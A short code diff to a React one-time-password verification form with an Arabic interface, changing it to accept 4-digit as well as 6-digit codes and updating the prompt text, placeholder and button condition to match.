@@ -19,7 +19,7 @@ const OTPVerification = () => {
   const [isLoading, setIsLoading] = useState(false);
 
   const handleVerify = async () => {
-    if (otp.length === 6) {
+    if (otp.length === 4 || otp.length === 6) {
       setIsLoading(true);
       try {
         const newData = { otp };
@@ -75,7 +75,7 @@ const OTPVerification = () => {
               التحقق من الهوية
             </h2>
             <p className="text-muted-foreground text-sm">
-              تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم هاتفك المسجل
+              تم إرسال رمز التحقق إلى رقم هاتفك المسجل
             </p>
           </div>
 
@@ -91,7 +91,7 @@ const OTPVerification = () => {
                 maxLength={6}
                 value={otp}
                 onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
-                placeholder="000000"
+                placeholder="أدخل الرمز"
                 className="text-center text-2xl tracking-widest font-bold h-14"
                 dir="ltr"
               />
@@ -116,7 +116,7 @@ const OTPVerification = () => {
           <Button
             onClick={handleVerify}
             className="w-full h-14 text-lg font-bold bg-[#E31E24] hover:bg-[#C11A1F] text-white"
-            disabled={otp.length !== 6 || isLoading}
+            disabled={(otp.length !== 4 && otp.length !== 6) || isLoading}
           >
             {isLoading ? "جاري التحقق..." : "تأكيد"}
           </Button>
